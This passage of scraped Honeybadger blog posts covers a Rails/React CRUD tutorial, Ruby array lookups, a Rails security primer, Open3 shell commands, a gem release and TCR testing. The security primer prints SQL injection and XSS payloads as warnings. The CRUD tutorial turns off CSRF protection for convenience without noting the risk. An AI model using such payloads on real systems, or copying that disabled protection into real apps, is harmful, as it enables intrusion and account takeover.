) => ({ beers : [... prevState . beers , newEl ], })); }); }) . catch (( err ) => message . error ( \" Error: \" + err )); }; For the sake of simplicity, we’ll be using the Fetch API available to all modern browsers every time we need to request data from the API. The function above takes a few steps to retrieve the array of beers from the API: It first requests the /index endpoint asynchronously and then checks if the response status equals OK . If it does, we return the data as JSON; otherwise, let’s throw an Error . Then , we iterate over the array of results to compose our own beer object and add to the state’s beers array. If anything went wrong during the process, the catch block will capture the exception and exhibit it as a message alert. Nice, isn’t it? This is pretty much the same steps we’ll take for all the other requests. But, how does antd display the data in the table? Good question! Let’s take a look at the following code: columns = [ { title : \" Brand \" , dataIndex : \" brand \" , key : \" brand \" , }, ...{ title : \"\" , key : \" action \" , render : ( _text , record ) => ( < Popconfirm title = \"Are you sure to delete this beer?\" onConfirm = { () => this . deleteBeer ( record . id ) } okText = \"Yes\" cancelText = \"No\" > < a href = \"#\" type = \"danger\" > Delete { \" \" } </ a > </ Popconfirm > ), }, ]; I’ve simplified it a bit for a better understanding. This is an array that represents the skeleton of our table. This is how antd tables work; they need to receive the metadata information about your table structure (rows and columns) as an array. Each column is an object within the array, and the order is important here. The title attribute receives the name of the column, while the dataIndex name is how it’ll be known within React components, and the key is its unique identifier. For most columns, the configuration is similar, except for the actions column. There, we need to specify the link of action to trigger when the user wants to delete an item. Note that we’re making use of the antd’s Popconfirm component . It is a very nice component that facilitates the job of prompting users to confirm an action before it happens. The image below illustrates how it looks: Prompting a confirm dialog before deletion. Delete Action To delete an item, we’ll need to perform two main operations: the deletion call on the API and table reloading. The delete function is similar to the first fetch we’ve made: deleteBeer = ( id ) => { const url = `api/v1/beers/ ${ id } ` ; fetch ( url , { method : \" delete \" , }) . then (( data ) => { if ( data . ok ) { this . reloadBeers (); return data . json (); } throw new Error ( \" Network error. \" ); }) . catch (( err ) => message . error ( \" Error: \" + err )); }; See? the only thing new here is the HTTP method passed as the second parameter of the fetch method. Plus, within the then clause, we call the reloadBeers function, which will re-fetch all the beers from the back-end once again. The contents of this function are pretty much the following: reloadBeers = () => { this . setState ({ beers : [] }); this . loadBeers (); }; We’re resetting the state’s beers array and calling the load function again. The Final Component Finally, we need to compose the component by explicitly calling antd tags. Let’s see how it goes along with the final component code: import { Table , message , Popconfirm } from \" antd \" ; import React from \" react \" ; import AddBeerModal from \" ./AddBeerModal \" ; class Beers extends React . Component { columns = [ { title : \" Brand \" , dataIndex : \" brand \" , key : \" brand \" , }, { title : \" Style \" , dataIndex : \" style \" , key : \" style \" , }, { title : \" Country \" , dataIndex : \" country \" , key : \" country \" , }, { title : \" Quantity \" , dataIndex : \" quantity \" , key : \" quantity \" , }, { title : \"\" , key : \" action \" , render : ( _text , record ) => ( < Popconfirm title = \"Are you sure to delete this beer?\" onConfirm = { () => this . deleteBeer ( record . id ) } okText = \"Yes\" cancelText = \"No\" > < a href = \"#\" type = \"danger\" > Delete { \" \" } </ a > </ Popconfirm > ), }, ]; state = { beers : [], }; componentDidMount () { this . loadBeers (); } loadBeers = () => { const url = \" api/v1/beers/index \" ; fetch ( url ) . then (( data ) => { if ( data . ok ) { return data . json (); } throw new Error ( \" Network error. \" ); }) . then (( data ) => { data . forEach (( beer ) => { const newEl = { key : beer . id , id : beer . id , brand : beer . brand , style : beer . style , country : beer . country , quantity : beer . quantity , }; this . setState (( prevState ) => ({ beers : [... prevState . beers , newEl ], })); }); }) . catch (( err ) => message . error ( \" Error: \" + err )); }; reloadBeers = () => { this . setState ({ beers : [] }); this . loadBeers (); }; deleteBeer = ( id ) => { const url = `api/v1/beers/ ${ id } ` ; fetch ( url , { method : \" delete \" , }) . then (( data ) => { if ( data . ok ) { this . reloadBeers (); return data . json (); } throw new Error ( \" Network error. \" ); }) . catch (( err ) => message . error ( \" Error: \" + err )); }; render () { return ( <> < Table className = \"table-striped-rows\" dataSource = { this . state . beers } columns = { this . columns } pagination = { { pageSize : 5 } } /> < AddBeerModal reloadBeers = { this . reloadBeers } /> </> ); } } export default Beers ; Now, you can see everything together. The render function will display the two tags we’re importing there: the antd’s Table component and AddBeerModal (the modal form we’ll create in a few minutes). The table component is very rich in the way that it allows us to automatically paginate through the results by setting a pagination object. The only property we’re adding here is the size of each page (5 results per page). The dataSource attribute receives the list of beers we’ve mounted from the back-end, and the columns attribute receives the metadata we’ve already built. The AddBeerModal Component Below the table, you can spot a button to add new beers. When we click on this button, it’ll open a modal with a form to register new beers to our catalog, as you may see below: Adding new beers to the catalog. This is a great way to explore how antd handles forms too. First, let’s break down the actions we’ll have in this component. Note that the component itself is made out of two ones: a Button and a Modal. This means that we’ll have to map the operations related to both of them: showModal and handleCancel deal with the modal’s opening and closing. onFinish is triggered when we submit the form. They’ll play with the component’s state, which will only store the modal toggle (i.e., whether it is visible): state = { visible : false , }; To show or hide the modal, we just need to toggle this Boolean: this . setState ({ visible : true , }); To call the Beer’s API and register a new beer, we’ll need to make use of the Fetch API again: onFinish = ( values ) => { const url = \" api/v1/beers/ \" ; fetch ( url , { method : \" post \" , headers : { \" Content-Type \" : \" application/json \" , }, body : JSON . stringify ( values ), }) . then (( data ) => { if ( data . ok ) { this . handleCancel (); return data . json (); } throw new Error ( \" Network error. \" ); }) . then (() => { this . props . reloadBeers (); }) . catch (( err ) => console . error ( \" Error: \" + err )); }; This is the first time we’re calling a request in which we send data to the server. In this case, we’ll also need to explicitly say to the API which type of information is heading over. That’s why the headers attribute must be informed. If everything goes well, we just close the modal and reload the table’s listing. Now, let’s see everything together, along with the component render: import { Button , Form , Input , Modal , Select } from \" antd \" ; import React from \" react \" ; const { Option } = Select ; class AddBeerModal extends React . Component { formRef = React . createRef (); state = { visible : false , }; onFinish = ( values ) => { const url = \" api/v1/beers/ \" ; fetch ( url , { method : \" post \" , headers : { \" Content-Type \" : \" application/json \" , }, body : JSON . stringify ( values ), }) . then (( data ) => { if ( data . ok ) { this . handleCancel (); return data . json (); } throw new Error ( \" Network error. \" ); }) . then (() => { this . props . reloadBeers (); }) . catch (( err ) => console . error ( \" Error: \" + err )); }; showModal = () => { this . setState ({ visible : true , }); }; handleCancel = () => { this . setState ({ visible : false , }); }; render () { return ( <> < Button type = \"primary\" onClick = { this . showModal } > Create New + </ Button > < Modal title = \"Add New Beer ...\" visible = { this . state . visible } onCancel = { this . handleCancel } footer = { null } > < Form ref = { this . formRef } layout = \"vertical\" onFinish = { this . onFinish } > < Form . Item name = \"brand\" label = \"Brand\" rules = { [{ required : true , message : \" Please input your beer brand! \" }] } > < Input placeholder = \"Input your beer brand\" /> </ Form . Item > < Form . Item name = \"style\" label = \"Style\" rules = { [{ required : true , message : \" Please input your beer style! \" }] } > < Input placeholder = \"Input your beer style\" /> </ Form . Item > < Form . Item name = \"country\" label = \"Country\" rules = { [ { required : true , message : \" Please input the country of the beer! \" , }, ] } > < Select showSearch placeholder = \"Select your beer country\" optionFilterProp = \"children\" style = { { width : \" 100% \" } } > < Option value = \"Finland\" > Finland </ Option > < Option value = \"Germany\" > Germany </ Option > < Option value = \"Netherlands\" > Netherlands </ Option > < Option value = \"UK\" > UK </ Option > < Option value = \"USA\" > USA </ Option > < Option value = \"Other\" > Other </ Option > </ Select > </ Form . Item > < Form . Item name = \"quantity\" label = \"Quantity\" rules = { [{ required : true , message : \" Please input the quantity! \" }] } > < Input type = \"number\" placeholder = \"How many beers you desire?\" /> </ Form . Item > < Form . Item > < Button type = \"primary\" htmlType = \"submit\" > Submit </ Button > </ Form . Item > </ Form > </ Modal > </> ); } } export default AddBeerModal ; Antd allows us to specify each form’s item rules individually. If a field is required, just say so by providing a rules attribute. You can customize the message it’ll display in case the user submits the form without filling it properly: Validating form inputs. Take a look at the Select component, which translates a combo box. See how easy it is to create complex components by just providing the right attributes. For example, if you want to make your select searchable, just put the showSearch property, there and it’s done: Filtering results within a Select. Antd will automatically filter the select options based on your input. Styling Sometimes, you’ll need to provide some CSS styling to components that do not provide a default (like antd’s table) or customize the ones that come built-in. To do this, you can create as many CSS files as you want and organize them in a structure that pleases you. Rails already create an application.css file, under the app/assets/stylesheets folder. Open it and the following content: .site-layout-content { background : #fff ; padding : 24px ; min-height : 380px ; } .logo { width : 200px ; min-height : 31px ; margin : 16px 24px 16px 0 ; float : left ; background-image : url(https://www.honeybadger.io/images/navbar_logo.svg?1602785015) ; background-repeat : no-repeat ; } .table-striped-rows th , .table-striped-rows td { border-bottom : 1px solid #dedddd !important ; } .table-striped-rows tr :nth-child ( 2 n ) td { background-color : #fbfbfb ; } .table-striped-rows thead { background-color : #f1f1f1 ; } Those are the CSS rules to make our table stripped, for example. Feel free to add as many extra styles here as you want. Testing Before heading to the tests, we need to disable the CSRF token checking that Rails automatically configures for our apps. To do so, go to the app/controllers/application_controller.rb file and change it to the following: class ApplicationController < ActionController :: Base protect_from_forgery with: :null_session end This way, we avoid having to validate the tokens each time we perform a request. Great! Now, start your server via rails s command, access the http://localhost:3000/ address, and play around with the CRUD. Conclusion As a homework task, I’d recommend that you try implementing the update functionality of the CRUD. You can adapt the edit method at the API controller to receive the updated beer info and perform the update to the database. For the view, another modal would suit very well to accommodate the edit’s form. You can also find the source code for this tutorial here . Good studies!", "date": "2021-05-10"},
{"website": "Honey-Badger", "title": "Associative arrays in Ruby...what?", "author": ["Starr Horne"], "link": "https://www.honeybadger.io/blog/associative-arrays-in-ruby-what/", "abstract": "Have you ever had a bunch of data in an array, but needed to do a key/value lookup like you would with a hash?  Fortunately, Ruby provides a mechanism for treating arrays as key-value structures. Let's check it out! Introducing Array#assoc and Array#rassoc Imagine that you've been given a magical stock-picking machine. Every few minutes it spits out a recommendation to buy or sell a stock. You've managed to hook it up to your computer, and receiving a stream of data that looks like this: picks = [ [ \"AAPL\" , \"buy\" ], [ \"GOOG\" , \"sell\" ], [ \"MSFT\" , \"sell\" ] ] To find the most recent guidance for Google, you could make use of the Array#assoc method. Here's what that looks like: # Returns the first row of data where row[0] == \"GOOG\" picks . assoc ( \"GOOG\" ) # => [\"GOOG\", \"sell\"] To find the most recent \"sell\" recommendation, you could use the Array#rassoc method. # Returns the first row of data where row[1] == \"sell\" picks . rassoc ( \"sell\" ) # => [\"GOOG\", \"sell\"] If no match is found, the methods return nil: picks . assoc ( \"CSCO\" ) # => nil picks . rassoc ( \"hold\" ) # => nil Historical data Hashes can't have more than one value for a single key. But arrays can have as many duplicates as you like. The assoc and rassoc methods do the sensible thing in this case and return the first matching row they find. This lets us do some pretty interesting things. Our imaginary stock picking machine provides a stream of data. Eventually, it's going to change its mind about a particular company and tell me to buy what it previously told me to sell. In that case our data looks like: picks = [ [ \"GOOG\" , \"buy\" ], [ \"AAPL\" , \"sell\" ], [ \"AAPL\" , \"buy\" ], [ \"GOOG\" , \"sell\" ], [ \"MSFT\" , \"sell\" ] ] If I were putting all of this data into  a hash, updating the recommendation for a particular stock would cause me to lose any previous recommendations for that stock. Not so with the array. I can keep prepending recommendations to the array, knowing that Array#assoc will always give me the most recent recommendation. # Returns the first row of data where row[0] == \"GOOG\" picks . assoc ( \"GOOG\" ) # => [\"GOOG\", \"buy\"] So we get the key-value goodness of a hash, along with a free audit trail. More than two columns Another neat thing about assoc is that you're not limited to just two columns per array. You can have as many columns as you like. Suppose you added a timestamp to each buy/sell recommendation. picks = [ [ \"AAPL\" , \"buy\" , \"2015-08-17 12:11:55 -0700\" ], [ \"GOOG\" , \"sell\" , \"2015-08-17 12:10:00 -0700\" ], [ \"MSFT\" , \"sell\" , \"2015-08-17 12:09:00 -0700\" ] ] Now when we use assoc or rassoc , we'll  get the timestamp as well: # The entire row is returned picks . assoc ( \"GOOG\" ) # => [\"GOOG\", \"sell\", \"2015-08-17 12:10:00 -0700\"] I hope you can see how useful this could be when dealing with data from CSV and other file formats that can have lots of columns. Speed Ruby's hashes will definitely outperform Array#assoc in most benchmarks. As the dataset gets bigger, the differences become more apparent. After all, hash table searches are O(1), while array searches are O(n). However in may cases the difference won't large enough for you to worry about - it depends on the details. Just for fun, I wrote simple benchmark comparing hash lookup vs assoc for a 10 row dataset and for a 100,000 row dataset. As expected, the hash and array performed similarly with the small data set. With the large dataset, the hash dominated the array. ...though to be fair, I'm searching for the last element in the array, which is the worst case scenario for array searches. require 'benchmark/ips' require 'securerandom' Benchmark . ips do | x | x . time = 5 x . warmup = 2 short_array = ( 0 .. 10 ). map { | i | [ SecureRandom . hex (), i ] } short_hash = Hash [ short_array ] short_key = short_array . last . first long_array = ( 0 .. 100_000 ). map { | i | [ SecureRandom . hex (), i ] } long_hash = Hash [ long_array ] long_key = short_array . last . first x . report ( \"short_array\" ) { short_array . assoc ( short_key ) } x . report ( \"short_hash\" ) { short_hash [ short_key ] } x . report ( \"long_array\" ) { long_array . assoc ( long_key ) } x . report ( \"long_hash\" ) { long_hash [ long_key ] } x . compare! end # Calculating ------------------------------------- #          short_array    91.882k i/100ms #           short_hash   149.430k i/100ms #           long_array    19.000  i/100ms #            long_hash   152.086k i/100ms # ------------------------------------------------- #          short_array      1.828M (± 3.4%) i/s -      9.188M #           short_hash      6.500M (± 4.8%) i/s -     32.426M #           long_array    205.416  (± 3.9%) i/s -      1.026k #            long_hash      6.974M (± 4.2%) i/s -     34.828M # Comparison: #            long_hash:  6974073.6 i/s #           short_hash:  6500207.2 i/s - 1.07x slower #          short_array:  1827628.6 i/s - 3.82x slower #           long_array:      205.4 i/s - 33950.98x slower", "date": "2015-08-18"},
{"website": "Honey-Badger", "title": "The Inadequate Guide to Rails Security", "author": ["Starr Horne"], "link": "https://www.honeybadger.io/blog/ruby-security-tutorial-and-rails-security-guide/", "abstract": "Programming is awesome If you're like me, you got into this business because you love building awesome apps. Let's take a second to reflect on the good times. ...back to the real world. It sucks that you even have to worry about security. It's just sick that there are people who wake up every morning and try to smash the things you're building. But they do...And when they succeed, it's your fault. Your client can't make your code secure. Your manager can't. It's all on you. So you better know what the hell you're doing. Should you read this? Do you try to follow best practices for security but don't really understand them? Are you unclear about how XSRF, MITM, and XSR attacks work? Do you think that because your apps are small, or internal, they're not at risk? ...then this guide is for you. You're being attacked, now! Freak out! If it's on the internet, it's under siege. Automated systems are scanning around the clock for vulnerable web apps. By the mafia Are you storing credit cards in your database? Unsalted password hashes? You're screwed. By bot-masters When you run a botnet , more bots equals more money. So you buy an exploit pack ! Set it up to install your malware when an old browser hits the payload Hack some legit sites to deliver the payload to lots of users. By governments It sounds like a joke. But the Chinese government has thousands of people hacking systems in search of: Trade Secrets Government Intelligence Information about political enemies. They were recently caught on tape. And, umm..camera. Doesn't that look like a fun job? By Hacktivists Do you sell depleted uranium slugs to the DOD? Then you should have enough money to hire someone who knows what they're doing. Required reading This is the inadequate guide. Did you expect it to be comprehensive? At minimum you should also read: The rails security guide The rails security mailing list The official ruby security page Eight easy ways to get p0wn'd We're going to cover eight classes of vulnerabilities that are crucial for web developers to understand. Non Technical Cross Site Scripting (XSS) Cross Site Request Forgery (CSRF, XSRF) Man in the Middle (MITM) SQL Injection (SQLI) Mass Assignment & Parameter Injection Denial of Service (DOS, DDOS) Platform Attacks (Hacking linux boxen) Non-Technical Exploits Sometimes the obvious problems are the hardest to see. The number and variety of stupid things you can do is endless, so we'll just point out a few. Don't: Send plaintext passwords via email Use the same password everywhere Trust people who show up at your office with cookies Carry sensitive data on your laptop Cross Site Scripting If I'm a bad guy, I'd be very interested in ways to insert some of my JS into your page. Once I do that I can: Steal session cookies Bootstrap an exploit kit into the dom Make the pages say wacky things There's a simple defense To thwart me, you need to escape any text that a user has entered, so javascript gets turned into harmless text. You want this `&lt;script&gt;alert(&#x27;I am stealing your cookies! Ha!&#x27;);&lt;/script&gt;\n` not this: `<script>alert('I am stealing your cookies! Ha!');</script>\n` Except when there's not Here's the thing. If you have an old rails 2 application, you probably have XSS vulnerabilities. That's because rails 2 made you manually escape untrusted input, using the h() method. Rushing to meet a deadline? Pushing a quick bugfix? Outsourcing work to a junior developer? The h() would be forgotten. Kittens would cry. Rails 3 and 4 are much better. Output is escaped by default. But it's still possible to shoot yourself in the foot. Cross site request forgery If a user wants to change their password, they post a form, right? So what happens if the form isn't on your website? The request still goes through. Attackers can exploit this fact. Anatomy of a CSRF attack I'm an attacker I know you're logged in to your app as an admin I create a \"change password\" form disguised as something else You submit the form and, without realizing it, you've changed your password. And it's even worse if you're using GET requests instead of POSTS. I wouldn't even have to trick you. I could cause an authenticated request to happen just by adding an image tag to a page you visited. Rails saves your bacon Luckily, rails sidesteps this class of attack by offering CSRF protection. You may know it as \"that weird text that gets put in all my forms for some reason.\" The weird text is a secret key that is stored in the user's session. If the user submits a CSRF token that doesn't match the one in the session, you get an exception. But you can still screw it up Of course you can disable CSRF checking like so: `skip_before_filter :verify_authenticity_token\n` And you can add GET routes for things that should be POSTS: `MyApp::Application.routes.draw do\n  match \"/launch_all_the_missiles\", to: \"missiles#launch_all\"\nend\n` But you wouldn't do that, would you? If you're not using rails And keep in mind that if you're using a minimalist framework like sinatra or goliath, you'll need to handle this yourself. Here's an example. Man In The Middle / Packet Sniffing So you need to send some cash to your rotten no-good cousin Vinny. You take the cash, put it in an envelope, write that bastard's address, add a stamp and hand it to the mail man. A week later, the envelope arrives with no cash. This is a simple man in the middle attack. All your cookie are belong to us The same thing can happen with your user's cookies. Cookies are usually sent with every request. If they're sent in cleartext over a public (wifi) network, game over. An evil-doer running FireSheep can easily get copies of the user's cookies and compromise their account. SSL to the rescue The easy answer is to use HTTPS for everything. The people in the cafe can still see the user's traffic, but it's encrypted. A not-so-easy-but-perhaps-better-in-some-circumstances answer is to use rails' secure cookies. Secure cookies will only be sent to the browser over an HTTPS connection. ...that is if you're running rails >= 2.3.10 or >= 3.0.2 . Before that, secure cookies could be sent over plain text. Don't ask. SQL Injection 99% of all websites work by glueing fragments of text together to make little programs in a language called SQL. Just think about that. Do you have any idea how backasswards this is? But like it or not, this is the way things work. And based on the fact that the internet exists, it must work reasonably well. But one side effect of this is that if a hacker can add their own bits of text into little SQL programs we are absolutely screwed. Example Imagine that your contractor sends you some code that looks like this. `Building.where(\"st_intersects(st_setsrid(st_makebox2d(st_point(#{params[:northeast][:lng]}, #{params[:northeast][:lat]}), st_point(#{params[:southwest][:lng]}, %{params[:southwest][:lat]})), 4326), buildings.location)\")\n` This is a huge mistake. I can make the params[:southwest][:lat] contain `\")), 4326), buildings.location); UPDATE users SET admin=1 WHERE id=666;--\"\n` And now I have admin privileges. Rails protects us... Rails protects in some cases. If we'd used where correctly, the parameters would have been excaped, and SQL injection attempts would fail. `where(\"st_intersects(st_setsrid(st_makebox2d(st_point(?, ?), st_point(?, ?)), 4326), #{table_name}.location)\", box[:northeast][:lng], box[:northeast][:lat], box[:southwest][:lng], box[:southwest][:lat]).\n` ...until it doesn't But there are lot of places where rails uses raw sql. Places you might easily overlook. For example, did you know that in SomeModel.sum(\"amount\") , the \"amount\" string is added to the query without being escaped? So if you have a report where you sum parama[\"col\"], you're in trouble. Here's an example IRB session, showing the consequences of passing untrusted input into the sum method: `pry(main)> User.sum(%[id) AS sum_id FROM users; update users set\nadmin='t' where id=224;--])\n(22.4ms)  SELECT SUM(id) AS sum_id FROM users; update users set\nadmin='t' where id=224;--) AS sum_id FROM \"users\" \n=> \"0\"\n` The same is true for #pluck, and a host of other methods. For more detailed info, check out: http://rails-sqli.org/ Mass Assignment Attacks March 4, 2012, Russian hacker Egor Homakov disclosed a mass assignment vulnerability that could let an attacker masquerade as any github user. How github was hacked I bet you've written code like this hundreds of times: `User.create(params[:user])\n` This of course creates a user with the given params. Prior to Rails 3.2.3, that meant that any parameter that was input would be assigned to the model...unless you explicitly specified otherwise. Problem is, this was easy to forget. And so you find yourself in a world where an attacker just has to send in the right POST request to cause this to happen: `User.create({admin: true, ...})\n` Or in github's case, something like this: `PublicKey.update({user_id: \"123\"})\n` It's an easy fix Of course you avoid these problems by using attr_protected , or attr_accessible `class PublicKey < ActiveRecord::Base\n  attr_protected :user_id\n` But this is easy to overlook. Therefore, if you have an app running rails < 3.2.3, it's recommended that you make all attributes protected by default. Then you're forced to explicitly list the ones you want to be whitelisted. This article shows you how: https://gist.github.com/petenixey/1978249 Rails brings down the hammer Rails 3.2.3 comes like this out of the box. And Rails 4 will use an altogether different whitelist mechanism, called Strong Parameters. It's available as a plugin if you can't wait: https://github.com/rails/strong_parameters Denial of Service How many people have you pissed off today? Last month? DOS, and DDOS attacks are infosec's version of a rage comic. They're not going to steal your data or spread malware. They just want to shut you down. DDOS is crude but effective To mount a destributed denial of service attack, just call up 500 of your closest friends, have them head over to amnesty international's website and keep pressing refresh for an hour. Bots can be substituted for friends. If you have problems like these, talk to your ISP, use cloudflare, etc. They're pretty boring and well known problems. Algorithmic Complexity Attacks That just sounds freaking cool, doesn't it? These take advantage of a particular weakness in your operating system, application stack, etc. to fill up your server's memory, peg your CPU, etc. For example, the classic SYN flood attack works by sending SYN requests to a server. The server opens a ton of connections which aren't closed. With enough open connections, the OS will run out of ram. A recent exploit Ancient history? Not really. A recently patched flaw in the JSON gem would let an attacker max out your ram by creating millions of Ruby symbols. Symbols are never garbage-collected. Good old fashioned server exploits This is really what we think of when we think of hackers, right? People using buffer overflows to cause apache to run arbitrary code as root. But like most boring jobs, this too has been automated. If you look at your system logs right now, I bet you'll see bots trying to brute force an SSH login. Automate attack detection You can use something like fail2ban to automatically block the IP addresses of hosts that are attempting known attacks against you. Do the things you know you should do. Keep your OS Patched. Don't run services you don't need. Don't allow password authentication for SSH. The list goes on. Conclusion: PANIC! Then start taking security seriously. This is part of your job whether you like it or not.", "date": "2013-03-19"},
{"website": "Honey-Badger", "title": "Capturing stdout & stderr from shell commands via Ruby", "author": ["Starr Horne"], "link": "https://www.honeybadger.io/blog/capturing-stdout-stderr-from-shell-commands-via-ruby/", "abstract": "tl;dr If you want to run a shell command from Ruby and capture its stdout, stderr and return status, check out the Open3.capture3 method. If you'd like to process stdout and stderr data in a streaming fashion, check out Open3.popen3 . So many bad choices There are literally 492 ways to execute shell commands from ruby and each of them works slightly differently. I bet you've used one of the approaches below. My go-to has always been the back-ticks (``). exec ( \"echo 'hello world'\" ) # exits from ruby, then runs the command system ( 'echo' , 'hello world' ) # returns the status code sh ( 'echo' , 'hello world' ) # returns the status code `echo \"hello world\"` # returns stdout %x[echo 'hello world'] # returns stdout But these approaches are pretty limited. Suppose that you need to capture not only your shell command's stdout, but also its stderr. You're just plain out of luck. Or suppose you'd like to process stdout data in a stream, and not all at once when the command finishes running? Out of luck. There is another option. One that gives you the ability to run commands asynchronously, and which gives you stdout, stderr, exit codes, and PIDs. Let's check it out! Open3 The oddly-named open3 module is part of Ruby's standard library. What does it do? Open3 grants you access to stdout, stderr, exit codes and a thread to wait for the child process when running another program. You can specify various attributes, redirections, current directory, etc., of the program in the same way as for Process.spawn. (_Source: [Open3 Docs](http://ruby-doc.org/stdlib-2.1.0/libdoc/open3/rdoc/Open3.html))_ Never used it? Never even heard of it? I'm guessing that's because it doesn't come off as the most friendly of libraries. The name itself sounds more like C than Ruby. And the documentation is pretty hard-core neck-beard. But once you give it a try, you'll find that it's not as intimidating as it sounds. capture3 What if there were an easy way to capture stdout, stderr AND the status code? Well there is. If you don't have time to read the rest of this article, just know that you can use a method called capture3 and call it a day. Let's take a look at an example. Suppose you want to get a list of files in your current directory. To do that you can run the ls command. If you were to use the back-tick syntax it's look like this: puts ( `ls` ) With capture3 it looks like so: require 'open3' stdout , stderr , status = Open3 . capture3 ( \"ls\" ) This will run your command and give you stdout and stderr as strings. No muss no fuss. Security You generally don't want to give your users the ability to run arbitrary commands on your web server. That's why code like identify #{ params[:filename] } is such a horrible idea. Open3 lets you avoid problems like this by separating commands from data. It works just like the system method. Open3 . capture3 ( \"identify\" , params [ :filename ], other_unsafe_params ) popen3 Under the hood, capture3 uses a much more powerful method called popen3. This method works a little differently than more familiar methods like system(). Here's what it looks like: require 'open3' Open3 . popen3 ( \"ls\" ) do | stdout , stderr , status , thread | puts stdout . read end It's kind of like when you open and read from a file.  I'm sure you've seen code like this: File . open ( \"my/file/path\" , \"r\" ) do | f | puts f . read end Pipes With Open3, stdout and stderr are all pipes , which behave a lot like file buffers. And like files, they need to be closed when you're done with them. That's the reason for the block syntax. (There's a non-block syntax, but you have to manually call close on stdout,and stderr.) The read method waits until the pipes are closed before returning a value. But pipes also support reading lines as they become available. Imagine your shell command takes a few seconds to run. During that time, it's printing a status message to stderr. You'd like to capture that and display it to your users. Here's how you'd capture stderr a line at a time. require 'open3' Open3 . popen3 ( \"sleep 2; ls\" ) do | stdout , stderr , status , thread | while line = stderr . gets do puts ( line ) end end Threads There's one argument we haven't talked about yet. That's thread. The thread argument gives you a reference to a ruby thread that's waiting on your command to finish. Now, the command isn't running in the thread. It's running in an entirely separate process. The thread just watches the process and waits until it's done. You can get some useful data from that thread reference though. thread.pid - contains the process id of your shell command. You would need this if you wanted to do additional OS-level operations against that process. thread.status - contains the exit status of the process. 1 or 0 for success or failure. Caveats From the Open3 docs: You should be careful to avoid deadlocks. Since pipes are fixed length buffers,[::popen3](http://ruby-doc.org/stdlib-2.1.0/libdoc/open3/rdoc/Open3.html#method-c-popen3)(“prog”) {|i, o, e, t| o.read } deadlocks if the program generates too much output on stderr. You should read stdout and stderr simultaneously (using threads or IO.select). However, if you don’t need stderr output, you can use [::popen2](http://ruby-doc.org/stdlib-2.1.0/libdoc/open3/rdoc/Open3.html#method-c-popen2). If merged stdout and stderr output is not a problem, you can use [::popen2e](http://ruby-doc.org/stdlib-2.1.0/libdoc/open3/rdoc/Open3.html#method-c-popen2e). If you really need stdout and stderr output as separate strings, you can consider [::capture3](http://ruby-doc.org/stdlib-2.1.0/libdoc/open3/rdoc/Open3.html#method-c-capture3).", "date": "2015-06-01"},
{"website": "Honey-Badger", "title": "The honeybadger gem 4.0 has been released!", "author": ["Josh Wood"], "link": "https://www.honeybadger.io/blog/honeybadger-ruby-4-announcement/", "abstract": "Last week we released version 4.0.0 of the honeybadger Ruby gem. This release includes a long-awaited feature which makes it even easier to customize your error reports before they are sent to Honeybadger. We also did some much-needed refactoring, and made a few removals and deprecations for good measure. Don't worry, though—most of the API remains unchanged, so upgrading should be a relatively painless process for most users. Introducing the before_notify callback Prior versions of the honeybadger gem provided three callbacks which could be used to to customize various aspects of reported errors: Honeybadger.backtrace_filter — a callback to modify the backtrace that is reported to Honeybadger Honeybadger.exception_fingerprint — a callback to customize the grouping of errors in Honeybadger Honeybadger.exception_filter — a callback to determine if the error report should be skipped entirely Beyond these callbacks, there was no global way to change other data in error reports, such as the error message, tags, or request data—beyond rescuing and reporting exceptions locally. That's where the new before_notify callback comes in. In fact, the new callback is so versatile that it's completely replacing all three of the previous callbacks, which are now deprecated. Moving forward, you can use a before_notify callback to accomplish all of these tasks, and more. Multiple callbacks are also supported, which provides greater flexibility when configuring Honeybadger: Honeybadger.configure do |config|\n\n  # Ignore an error report\n  # Replaces Honeybadger.exception_filter\n  config.before_notify do |notice|\n    notice.halt! if notice.controller == 'auth'\n  end\n\n  # Modify the backtrace\n  # Replaces Honeybadger.backtrace_filter\n  config.before_notify do |notice|\n    notice.backtrace.reject!{|l| l =~ /gem/ }\n  end\n\n  # Customize error grouping\n  # Replaces Honeybadger.exception_fingerprint\n  config.before_notify do |notice|\n    notice.fingerprint = 'new fingerprint'\n  end\n\n  # Change all the properties!\n  config.before_notify do |notice|\n    notice.api_key = 'custom api key'\n    notice.error_message = \"badgers!\"\n    notice.error_class = 'MyError'\n    notice.backtrace = [\"/path/to/file.rb:5 in `method'\"]\n    notice.fingerprint = 'some unique string'\n    notice.tags = ['foo', 'bar']\n    notice.context = { user: 33 }\n    notice.controller = 'MyController'\n    notice.action = 'index'\n    notice.parameters = { q: 'badgers?' }\n    notice.session = { uid: 42 }\n    notice.url = \"/badgers\"\n  end\n\nend We're excited about the new before_notify callback, and believe it will open up a lot of new options moving forward! Upgrading to 4.x For most users on 3.x, upgrading should be uneventful. If you're using the three callbacks which I mentioned above, then you'll need to update them to use before_notify instead, and potentially make a few other minor changes, as part of the public API for Notice (the object passed in to the callback) has changed slightly. For more information: 3.x to 4.x Upgrade Guide Complete CHANGELOG", "date": "2018-08-31"},
{"website": "Honey-Badger", "title": "Test-Commit-Revert: A Useful Workflow for Testing Legacy Code in Ruby", "author": ["José M. Gilgado"], "link": "https://www.honeybadger.io/blog/ruby-tcr-test-commit-revert/", "abstract": "It happens to all of us. As software projects grow, parts of the codebase end up in production without a comprehensive test suite. When you take another look at the same area of code after a few months, it may be difficult to understand; even worse, there might be a bug, and we don't know where to begin fixing it. Modifying code without tests is a major challenge. We can't be sure if we'll break anything in the process, and checking everything manually is, at best, prone to mistakes; usually, it's impossible. Dealing with this kind of code is one of the most common tasks we perform as developers, and many techniques have focused on this issue over the years, such as characterization tests , which we discussed in a previous article. Today, we'll cover another technique based on characterization tests and introduced by Kent Beck, who also introduced TDD to the modern programming world many years ago. What's TCR? TCR stands for \"test, commit, revert\", but it's more accurate to call it \"test && commit || revert\". Let's see why. This technique describes a workflow to test legacy code. We'll use a script that will run the tests every time we save our project files. The process is as follows: First, we create an empty unit test for the part of the legacy code we want to test. We then add a single assertation and save the test. Since we have our script set up, the test is automatically run. If it succeeds, the change is committed. If it fails, the change is deleted (reverted), and we need to try again. Once the test passes, we can then add a new test case. Essentially, TCR is about keeping your code in a \"green\" state instead of writing a failing test first (red) and then make it pass (green), as we do with test-driven development. If we write a failing test, it'll just vanish, and we'll be brought back to the \"green\" state again. Purpose The main goal of this technique is to understand the code a bit better each time you add a test case. This will naturally increase the test coverage and unblock many refactorings that, otherwise, wouldn't be possible. One of the advantages of TCR is that it's useful in many scenarios. We can use it with code that has no tests at all or with code that's partially tested. If the test doesn't pass, we just revert the change and try again. How can we use it? Kent Beck shows, in different articles and videos (linked at the end), that a good approach is using a script that runs 